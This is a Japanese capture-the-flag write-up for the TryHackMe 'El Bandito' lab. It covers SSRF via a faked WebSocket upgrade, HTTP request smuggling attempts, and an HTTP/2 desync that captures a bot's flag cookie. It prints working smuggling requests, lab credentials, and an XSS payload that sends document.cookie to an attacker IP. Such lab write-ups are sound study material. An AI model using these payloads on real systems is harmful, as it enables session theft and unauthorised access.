# El Bandito CTF

https://tryhackme.com/r/room/elbandito

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.164.246

root@ip-10-10-122-245:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-15 04:31 GMT
Nmap scan report for 10.10.164.246
Host is up (0.00030s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
631/tcp  open  ipp
8080/tcp open  http-proxy
MAC Address: 02:D2:BD:FD:25:0F (Unknown)

root@ip-10-10-122-245:~# sudo nmap -sV -p22,80,631,8080 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-15 04:31 GMT
Nmap scan report for 10.10.164.246
Host is up (0.00023s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  ssl/http El Bandito Server
631/tcp  open  ipp      CUPS 2.4
8080/tcp open  http     nginx
```

8080 ポートは仮想通貨のページが表示される。80 は通信切断され表示できない。  
とりあえず 8080 ポートを調べる。

### gobuster

```shell
root@ip-10-10-66-223:~# cat ./out2.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.68.105:8080
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info                 (Status: 200) [Size: 2]
/admin                (Status: 403) [Size: 146]
/health               (Status: 200) [Size: 150]
/assets               (Status: 200) [Size: 0]
/traceroute           (Status: 403) [Size: 146]
/trace                (Status: 403) [Size: 146]
/environment          (Status: 403) [Size: 146]
/administration       (Status: 403) [Size: 146]
/envelope_small       (Status: 403) [Size: 146]
/error                (Status: 500) [Size: 88]
/envelope             (Status: 403) [Size: 146]
/administrator        (Status: 403) [Size: 146]
/metrics              (Status: 403) [Size: 146]
/envolution           (Status: 403) [Size: 146]
/env                  (Status: 403) [Size: 146]
/dump                 (Status: 403) [Size: 146]
/tracert              (Status: 403) [Size: 146]
/administr8           (Status: 403) [Size: 146]
/environmental        (Status: 403) [Size: 146]
/administrative       (Status: 403) [Size: 146]
/tracer               (Status: 403) [Size: 146]
/administratie        (Status: 403) [Size: 146]
/token                (Status: 200) [Size: 7]
/admins               (Status: 403) [Size: 146]
/admin_images         (Status: 403) [Size: 146]
/envelopes            (Status: 403) [Size: 146]
/administrivia        (Status: 403) [Size: 146]
/beans                (Status: 403) [Size: 146]
/env40x40             (Status: 403) [Size: 146]
/traces               (Status: 403) [Size: 146]
/enviro               (Status: 403) [Size: 146]
/environnement        (Status: 403) [Size: 146]
/enve                 (Status: 403) [Size: 146]
/administrative-law   (Status: 403) [Size: 146]
/traceback            (Status: 403) [Size: 146]
/administrators       (Status: 403) [Size: 146]
/tracemap_small       (Status: 403) [Size: 146]
/tracemap_large       (Status: 403) [Size: 146]
/admin1               (Status: 403) [Size: 146]
/trace1               (Status: 403) [Size: 146]
/environ              (Status: 403) [Size: 146]
/administer           (Status: 403) [Size: 146]
/admin3_gtpointup     (Status: 403) [Size: 146]
/beanshell            (Status: 403) [Size: 146]
/dumpster-diving      (Status: 403) [Size: 146]
/envhoax              (Status: 403) [Size: 146]
/envs                 (Status: 403) [Size: 146]
/admin_hp             (Status: 403) [Size: 146]
/traceability         (Status: 403) [Size: 146]
/admin25              (Status: 403) [Size: 146]
/envivio-color        (Status: 403) [Size: 146]
/envir                (Status: 403) [Size: 146]
/tracesanction        (Status: 403) [Size: 146]
/envelope_icon        (Status: 403) [Size: 146]
/envirohealth         (Status: 403) [Size: 146]
/envelope2            (Status: 403) [Size: 146]
/envy                 (Status: 403) [Size: 146]
/admin02              (Status: 403) [Size: 146]
/environments         (Status: 403) [Size: 146]
/administrationinfo   (Status: 403) [Size: 146]
/admin_thumb          (Status: 403) [Size: 146]
/admin_full           (Status: 403) [Size: 146]
/admin_functions      (Status: 403) [Size: 146]
/traceabilitybcp_v1   (Status: 403) [Size: 146]
/traceroute_art       (Status: 403) [Size: 146]
/External%5CX-News    (Status: 400) [Size: 0]
/tracert_broken       (Status: 403) [Size: 146]
/trace-ping           (Status: 403) [Size: 146]
/traceroute-          (Status: 403) [Size: 146]
/traceroute-eng       (Status: 403) [Size: 146]
/trace-them           (Status: 403) [Size: 146]
/traceroute-tables    (Status: 403) [Size: 146]
/trace4               (Status: 403) [Size: 146]
/admin2               (Status: 403) [Size: 146]
/traceremover         (Status: 403) [Size: 146]
/traceless            (Status: 403) [Size: 146]
/adminhelp            (Status: 403) [Size: 146]
/tracemap             (Status: 403) [Size: 146]
/envision             (Status: 403) [Size: 146]
/administratoraccounts (Status: 403) [Size: 146]
/traceme              (Status: 403) [Size: 146]
/tracerx              (Status: 403) [Size: 146]
/dumpdates            (Status: 403) [Size: 146]
/dumps                (Status: 403) [Size: 146]
/environmental_issues (Status: 403) [Size: 146]
/adminoffice          (Status: 403) [Size: 146]
/envelope_21x16       (Status: 403) [Size: 146]
/envelopes_110x19     (Status: 403) [Size: 146]
/administracja        (Status: 403) [Size: 146]
/environmental-law    (Status: 403) [Size: 146]

[!] Keyboard interrupt detected, terminating.

===============================================================
Finished
===============================================================
```

大量に出てきて困る。ただしほとんどは Forbidden。

### CL.TE

効果なし

```HTTP
GET /index.html HTTP/1.1
Host: 10.10.91.35:8080
Connection: keep-alive
Content-Length: 137
Transfer-Encoding: chunked

0

GET /environment HTTP/1.1
Host: http://10.10.91.35:8080/
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

```

## SSRF

service ページにこのスクリプトがある。  
/isOnline?url=${serviceUrl}` の形で SSRF ができそう。

```javascript
<script type="text/javascript">
      const currentYear = new Date().getFullYear();
document.getElementById("current-date").textContent = currentYear;

const serviceURLs = [
  "http://bandito.websocket.thm",
  "http://bandito.public.thm"
];

async function checkServiceStatus() {
  for (let serviceUrl of serviceURLs) {
    try {
       const response = await fetch(`/isOnline?url=${serviceUrl}`, {
        method: 'GET',
      });

      if (response.ok) {
        let existingContent = document.getElementById("output").innerHTML;
        document.getElementById("output").innerHTML = `${existingContent}<br/>${serviceUrl}: <strong>ONLINE</strong>`;
      } else {
        throw new Error('Service response not OK');
      }
    } catch (error) {
      let existingContent = document.getElementById("output").innerHTML;
      document.getElementById("output").innerHTML = `${existingContent}<br/>${serviceUrl}: <strong>OFFLINE</strong>`;
    }
  }
}

// Call the function on document ready
document.addEventListener('DOMContentLoaded', checkServiceStatus);
</script>
```

Kali の IP 指定でリクエストを出せることは確認したが、何かに使えるのか？

```javascript
var response = await fetch(
  "http://10.10.68.105:8080/isOnline?url=http://10.2.22.182:8888/",
  {
    method: "GET",
  }
);
```

```shell
$ python ./myserver.py
Serving on port 8888...
Request Headers:
Host: 10.2.22.182:8888
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/4.9.3
10.10.68.105 - - [15/Jan/2025 00:33:17] "GET / HTTP/1.1" 200 -
```

SSRF で 101 応答を返す方法を試みたところ、403 ではなくなったのでフロントエンドサーバーの制限をバイパスできたと思われる。

```http
GET /isOnline?url=http://10.2.22.182:8888 HTTP/1.1
Host: 10.10.91.35:8080
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
Content-Length: 0

GET /admin HTTP/1.1
Host: 10.10.91.35:8080

↓

HTTP/1.1 101
Server: nginx
Date: Wed, 15 Jan 2025 07:08:54 GMT
Connection: upgrade
X-Application-Context: application:8081

HTTP/1.1 404
X-Application-Context: application:8081
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Wed, 15 Jan 2025 07:08:54 GMT

6d
{"timestamp":1736924934957,"status":404,"error":"Not Found","message":"No message available","path":"/admin"}
0
```

gobuster で大量に出てきたパスの中に有効なものがあるか分からないので、リストを作って、intruder で総当たりする。（admin の部分を変数にする）

いくつかのパスで情報を取得できた。

- trace
- metrics
- env
- dump
- beans

これらの中で、次のパスを発見した。

```text
/admin-creds
/admin-flag
```

### admin-creds

```http
GET /isOnline?url=http://10.2.22.182:8888 HTTP/1.1
Host: 10.10.91.35:8080
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
Content-Length: 0

GET /admin-creds HTTP/1.1
Host: 10.10.91.35:8080

↓

HTTP/1.1 101
Server: nginx
Date: Wed, 15 Jan 2025 07:41:18 GMT
Connection: upgrade
X-Application-Context: application:8081

HTTP/1.1 200
X-Application-Context: application:8081
Content-Type: text/plain
Content-Length: 55
Date: Wed, 15 Jan 2025 07:41:18 GMT

username:hAckLIEN password:YouCanCatchUsInYourDreams404
```

```text
username: hAckLIEN
password: YouCanCatchUsInYourDreams404
```

### admin-flag

```http
GET /isOnline?url=http://10.2.22.182:8888 HTTP/1.1
Host: 10.10.91.35:8080
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
Content-Length: 0

GET /admin-flag HTTP/1.1
Host: 10.10.91.35:8080

↓

HTTP/1.1 101
Server: nginx
Date: Wed, 15 Jan 2025 07:43:43 GMT
Connection: upgrade
X-Application-Context: application:8081

HTTP/1.1 200
X-Application-Context: application:8081
Content-Type: text/plain
Content-Length: 43
Date: Wed, 15 Jan 2025 07:43:43 GMT

THM{:::MY_D...:::}
```

フラグ１ゲット！

### username: hAckLIEN

SSH の認証情報ではなかった。使う場所が分からない。

```shell
$ ssh hAckLIEN@10.10.91.35
The authenticity of host '10.10.91.35 (10.10.91.35)' can't be established.
ED25519 key fingerprint is SHA256:hv4HMhlnDdgu6InOpgBdhu1NI9/tBR0+7lB6bY3wQYI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.91.35' (ED25519) to the list of known hosts.
hAckLIEN@10.10.91.35: Permission denied (publickey).
```

## 631 ポート（ipp, CUPS）

http://10.10.91.35:631 で forbidden が表示された。  
どこかに管理画面があるかもしれない。

````shell
root@ip-10-10-224-7:~# gobuster dir -u http://10.10.91.35:631 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.91.35:631
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/de                   (Status: 200) [Size: 2316]
/fr                   (Status: 200) [Size: 2340]
/admin                (Status: 403) [Size: 370]
/es                   (Status: 200) [Size: 2478]
/ru                   (Status: 200) [Size: 2739]
/jobs                 (Status: 200) [Size: 2329]
/ja                   (Status: 200) [Size: 2263]
/help                 (Status: 200) [Size: 3137]
/printers             (Status: 200) [Size: 2009]
/classes              (Status: 200) [Size: 2003]
/administration       (Status: 403) [Size: 370]
/da                   (Status: 200) [Size: 2311]
/'                    (Status: 403) [Size: 370]
/jobsearch            (Status: 200) [Size: 2329]
/jobseeker            (Status: 200) [Size: 2329]
/administrator        (Status: 403) [Size: 370]
/administr8           (Status: 403) [Size: 370]
/administrative       (Status: 403) [Size: 370]
/jobsite71            (Status: 200) [Size: 2329]
/administratie        (Status: 403) [Size: 370]
/jobs-off             (Status: 200) [Size: 2329]
/pt_BR                (Status: 200) [Size: 2480]
/admins               (Status: 403) [Size: 370]
/jobsbutton           (Status: 200) [Size: 2329]
/admin_images         (Status: 403) [Size: 370]
/administrivia        (Status: 403) [Size: 370]
/jobs_but             (Status: 200) [Size: 2329]
/jobs_banner          (Status: 200) [Size: 2329]
/jobseekers           (Status: 200) [Size: 2329]
/Oasis - 'Definitely Maybe' (Status: 403) [Size: 370]
/Who's-Connecting     (Status: 403) [Size: 370]
/jobsblog             (Status: 200) [Size: 2329]
/jobsite              (Status: 200) [Size: 2329]
/printersupplies      (Status: 200) [Size: 2009]
/administrative-law   (Status: 403) [Size: 370]
/administrators       (Status: 403) [Size: 370]
/admin1               (Status: 403) [Size: 370]
/jobs_nav             (Status: 200) [Size: 2329]
/jobs_sm              (Status: 200) [Size: 2329]
/jobsite-gif          (Status: 200) [Size: 2329]
/administer           (Status: 403) [Size: 370]
/jobs_logo            (Status: 200) [Size: 2329]
/admin3_gtpointup     (Status: 403) [Size: 370]
/admin_hp             (Status: 403) [Size: 370]
/jobshq               (Status: 200) [Size: 2329]
/jobseekerx           (Status: 200) [Size: 2329]
/jobstar              (Status: 200) [Size: 2329]
/jobscipher           (Status: 200) [Size: 2329]
/admin25              (Status: 403) [Size: 370]
/%3FRID%3D2671        (Status: 200) [Size: 2262]
/don%27t%20fuck%20this%20up (Status: 403) [Size: 370]
/Godwin%27s_Law       (Status: 403) [Size: 370]
/Hacker's Delight     (Status: 403) [Size: 370]
/Handyman's Handbook  (Status: 403) [Size: 370]
/Sam's Teach Yourself Adobe Photoshop CS2 in 24 (Status: 403) [Size: 370]
/admin02              (Status: 403) [Size: 370]
/administrationinfo   (Status: 403) [Size: 370]
/jobspage             (Status: 200) [Size: 2329]
/FAQ's                (Status: 403) [Size: 370]
/jobs_eng             (Status: 200) [Size: 2329]
/admin_full           (Status: 403) [Size: 370]
/admin_thumb          (Status: 403) [Size: 370]
/admin_functions      (Status: 403) [Size: 370]
/jobs-descriptions    (Status: 200) [Size: 2329]
/RA_Bust'em           (Status: 403) [Size: 370]
/jobsclassified       (Status: 200) [Size: 2329]
/admin2               (Status: 403) [Size: 370]
/What%27s_afoot       (Status: 403) [Size: 370]
/Cabela's African Safari100 Mb (Status: 403) [Size: 370]
/Cabela's African Safari (Status: 403) [Size: 370]
/adminhelp            (Status: 403) [Size: 370]
/administratoraccounts (Status: 403) [Size: 370]
/jobsitenav           (Status: 200) [Size: 2329]
/jobs_39x21           (Status: 200) [Size: 2329]
/Men%27s_Health       (Status: 403) [Size: 370]
/Women%27s_Health     (Status: 403) [Size: 370]
/Godwin's_law         (Status: 403) [Size: 370]
/jobs_post            (Status: 200) [Size: 2329]
/People%27s_Daily     (Status: 403) [Size: 370]
/I Don't Need A Man   (Status: 403) [Size: 370]
/Call Me When You're Sober (Status: 403) [Size: 370]
/I Don't Feel Like Dancing (Status: 403) [Size: 370]
/That's That          (Status: 403) [Size: 370]
/Let's Ride           (Status: 403) [Size: 370]
/Everything's Just Wonderful (Status: 403) [Size: 370]
/jobs_1               (Status: 200) [Size: 2329]
/jobs_86x401          (Status: 200) [Size: 2329]
/adminoffice          (Status: 403) [Size: 370]
/administracja        (Status: 403) [Size: 370]
/jobs1                (Status: 200) [Size: 2329]
/jobsite_logo         (Status: 200) [Size: 2329]
/Women%27s%20Rights%20in%20Islam%20-%20Modernising%20or%20Outdated (Status: 403) [Size: 370]
/%22julie%20roehm%22  (Status: 403) [Size: 370]
/%22james%20kim%22    (Status: 403) [Size: 370]
/%22britney%20spears%22 (Status: 403) [Size: 370]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================```
````

gobuster で 200 が返っているパスも、ブラウザで見ると forbidden だった。  
どうやら AttackBox 上のブラウザでしかページが表示されないようだ・・・

http://10.10.76.82:631/help を見ると、/admin へのリンクがあり、クリックすると Forbidden になる。  
その制限をバイパスする方針で行く。ユーザー名とパスワードの使い道は謎のまま。

### スマグリング

色々試すが全く効果なし。

#### CL.TE

```http
GET / HTTP/1.1
Host: 10.10.76.82:631
Connection: keep-alive
Cookie: org.cups.sid=5bcebb130465919c830a8f92fdd3b139
Content-Length: 49
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: 10.10.76.82:631

↓

HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Language: en
Content-Length: 2262
Content-Type: text/html; charset=utf-8
Date: Thu, 16 Jan 2025 00:21:59 GMT
Keep-Alive: timeout=10
Last-Modified: Sun, 24 Dec 2023 02:23:24 GMT
Accept-Encoding: gzip, deflate, identity
Server: CUPS/2.4 IPP/2.1
Set-Cookie: org.cups.sid=5bcebb130465919c830a8f92fdd3b139; path=/; httponly;
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'

```

#### TE.CL

```http
GET / HTTP/1.1
Host: 10.10.76.82:631
Connection: keep-alive
Cookie: org.cups.sid=5bcebb130465919c830a8f92fdd3b139
Content-Length: 74
Transfer-Encoding: chunked

42

GET /admin HTTP/1.1
Host: 10.10.76.82:631
Content-Length: 1

0

```

#### TE.TE

```http
GET / HTTP/1.1
Host: 10.10.76.82:631
Connection: keep-alive
Cookie: org.cups.sid=5bcebb130465919c830a8f92fdd3b139
Content-Length: 74
Transfer-Encoding: chunked
Transfer-Encoding: chunked1

42

GET /admin HTTP/1.1
Host: 10.10.76.82:631
Content-Length: 1

0

```

#### h2c

```shell
root@ip-10-10-132-40:~/h2csmuggler# python3 h2csmuggler.py -x http://10.10.76.82:631/ http://10.10.76.82:631/admin
[INFO] Failed to upgrade: http://10.10.76.82:631/
```

## 80 ポート

AttackBox で https://10.10.76.82:80/ を表示し、ソースを見たら message.js のリンクがあった。

```javascript
document.addEventListener("DOMContentLoaded", function () {
  const discussions = document.querySelectorAll(".discussion");
  const messagesChat = document.querySelector(".messages-chat");
  const headerName = document.querySelector(".header-chat .name");
  const writeMessageInput = document.querySelector(".write-message");
  let userMessages = {
    JACK: [],
    OLIVER: [],
  };

  // Function to fetch messages from the server
  function fetchMessages() {
    fetch("/getMessages")
      .then((response) => {
        if (!response.ok) {
          throw new Error("Failed to fetch messages");
        }
        return response.json();
      })
      .then((messages) => {
        userMessages = messages;
        userMessages.JACK === undefined
          ? (userMessages = { OLIVER: messages.OLIVER, JACK: [] })
          : userMessages.OLIVER === undefined &&
            (userMessages = { JACK: messages.JACK, OLIVER: [] });

        displayMessages("JACK");
      })
      .catch((error) => console.error("Error fetching messages:", error));
  }

  // Function to display messages for the selected user
  function displayMessages(userName) {
    headerName.innerText = userName;
    messagesChat.innerHTML = "";
    userMessages[userName].forEach(function (messageData) {
      appendMessage(messageData);
    });
  }

  // Function to append a message to the chat area
  function appendMessage(messageData) {
    const newMessage = document.createElement("div");
    console.log({ messageData });
    newMessage.classList.add("message", "text-only");
    newMessage.innerHTML = `
           ${messageData.sender !== "Bot" ? '<div class="response">' : ""}
        <div class="text">${messageData}</div>
    ${messageData.sender !== "Bot" ? "</div>" : ""}
        `;
    messagesChat.appendChild(newMessage);
  }

  // Function to send a message to the server
  function sendMessage() {
    const messageText = writeMessageInput.value.trim();
    if (messageText !== "") {
      const activeUser = headerName.innerText;
      const urlParams = new URLSearchParams(window.location.search);
      const isBot =
        urlParams.has("msg") && urlParams.get("msg") === messageText;

      const messageData = {
        message: messageText,
        sender: isBot ? "Bot" : activeUser, // Set the sender as "Bot"
      };
      userMessages[activeUser].push(messageData);
      appendMessage(messageText);
      writeMessageInput.value = "";
      scrollToBottom();
      console.log({ activeUser });
      fetch("/send_message", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: "data=" + messageText,
      })
        .then((response) => {
          if (!response.ok) {
            throw new Error("Network response was not ok");
          }
          console.log("Message sent successfully");
        })
        .catch((error) => {
          console.error("Error sending message:", error);
          // Handle error (e.g., display error message to the user)
        });
    }
  }

  // Event listeners
  discussions.forEach(function (discussion) {
    discussion.addEventListener("click", function () {
      const userName = this.dataset.name;
      console.log({ userName });
      displayMessages(userName.toUpperCase());
    });
  });

  const sendButton = document.querySelector(".send");
  sendButton.addEventListener("click", sendMessage);
  writeMessageInput.addEventListener("keydown", function (event) {
    if (event.key === "Enter") {
      event.preventDefault();
      sendMessage();
    }
  });

  // Initial actions
  fetchMessages();
});

// Function to scroll to the bottom of the messages chat
function scrollToBottom() {
  const messagesChat = document.getElementById("messages-chat");
  messagesChat.scrollTop = messagesChat.scrollHeight;
}
```

注目はこの部分。XSS でセッションクッキーを盗む方針。

```javascript
fetch("/getMessages").then((response) => {
  if (!response.ok) {
    throw new Error("Failed to fetch messages");
  }
  return response.json();
});

fetch("/send_message", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "data=" + messageText,
});
```

### XSS

ペイロード

```javascript
fetch("/send_message", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body:
    "data=" +
    '<img src=x onerror=this.src="http://10.2.22.182:8888/?c="+document.cookie>',
});
```

無効な URL だと言われてしまった。

```text
TypeError: Window.fetch: /send_message is not a valid URL.
```

https://10.10.76.82:80/getMessages をブラウザで開いたら、ログイン画面が出てきた。  
例のユーザー名とパスワードでログインできた！  
チャット画面が表示されている。

## チャット画面

### 再び XSS

```javascript
<img src=x onerror=this.src="http://10.2.22.182:8888/?c="+document.cookie>
```

console を見たら、script-src "self" エラーが出ていた。  
インラインスクリプトを実行できないことを意味するので、XSS は無理と判断。

### リクエストスマグリング

HTTP1.1 に変更して、Content-Length: 0 とすることで、応答が 2 つ返る。

```http
GET / HTTP/1.1
Host: 10.10.1.190:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z4huZg.6eif3yssuy74mI949gSV0i9xDqI
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://10.10.1.190:80/messages
Content-Type: application/x-www-form-urlencoded
Origin: https://10.10.1.190:80
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Content-Length: 0

GET / HTTP/1.1
Host: 10.10.1.190:80
```

↓

```text
HTTP/1.1 200 OK
Date: Thu, 16 Jan 2025 02:54:57 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 58
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Feature-Policy: microphone 'none'; geolocation 'none';
Age: 0
Server: El Bandito Server
Accept-Ranges: bytes
Connection: keep-alive

nothing to see <script src='/static/messages.js'></script>HTTP/1.1 200 OK
Date: Thu, 16 Jan 2025 02:54:57 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 58
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Feature-Policy: microphone 'none'; geolocation 'none';
Age: 0
Server: El Bandito Server
Accept-Ranges: bytes
Connection: keep-alive

nothing to see <script src='/static/messages.js'></script>
```

2 つ目のリクエストを send_message にして、data= で他人のリクエスト内容を保存させる方針にすると、リクエストは下記になる。

```http
GET / HTTP/1.1
Host: 10.10.1.190:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z4huZg.6eif3yssuy74mI949gSV0i9xDqI
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://10.10.1.190:80/messages
Content-Type: application/x-www-form-urlencoded
Origin: https://10.10.1.190:80
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Content-Length: 0

POST /send_message HTTP/1.1
Host: 10.10.1.190:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z4huZg.6eif3yssuy74mI949gSV0i9xDqI
Content-Length: 500

data=
```

これは機能しなかった。  
試行錯誤して下記の条件で機能することが分かった。  
Content-Length は分かるが、POST と HTTP2 はよく分からない。

- 1 つ目のリクエストを POST に変更
- 1 つ目のリクエストを HTTP2 に変更
- 2 つ目のリクエストの Content-Length の値を調整（小さいと途中で切れる、大きいと何も保存されなくなる）

```http
POST / HTTP/2
Host: 10.10.1.190:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z4huZg.6eif3yssuy74mI949gSV0i9xDqI
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Length: 0

POST /send_message HTTP/1.1
Host: 10.10.1.190:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z4huZg.6eif3yssuy74mI949gSV0i9xDqI
Content-Type: application/x-www-form-urlencoded
Content-Length: 730

data=
```

https://10.10.1.190:80/getMessages で保存されたデータを取得

```json
"GET /access HTTP/1.1\r\nhost: bandito.public.thm:80\r\nscheme: https\r\nsec-ch-ua: \"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"HeadlessChrome\";v=\"122\"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: \"Linux\"\r\nupgrade-insecure-requests: 1\r\nuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.128 Safari/537.36\r\naccept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nsec-fetch-site: none\r\nsec-fetch-mode: navigate\r\nsec-fetch-user: ?1\r\nsec-fetch-dest: document\r\naccept-encoding: gzip, deflate, br\r\ncookie: flag=THM{...}\r\nX-Forwarded-For: 172.31.0.1\r\nX-Varnis"
```

## 振り返り

- 初めての難易度 Hard
- リクエストスマグリングの最終試験だから分かったが、普通はフロントエンドサーバーとバックエンドサーバーに分かれていること自体、気付きにくい。
- 80 ポートが AttachBox でしか表示できないことに気付かず、かなりの時間を浪費した。
- 631 ポートは純粋に罠だったが、ブラウザで管理画面を表示できることを知れたので無駄ではなかった。
- 最後のリクエストスマグリングで、1 つ目のリクエストを HTTP2 にする必要があった理由について、HTTP/1.1 と HTTP/2 では、フロントエンドとバックエンド間の通信で、別々の TCP 接続が作られているのではないかと推測。それが正しいとすれば、POST と GET でも分かれていると考えられる。
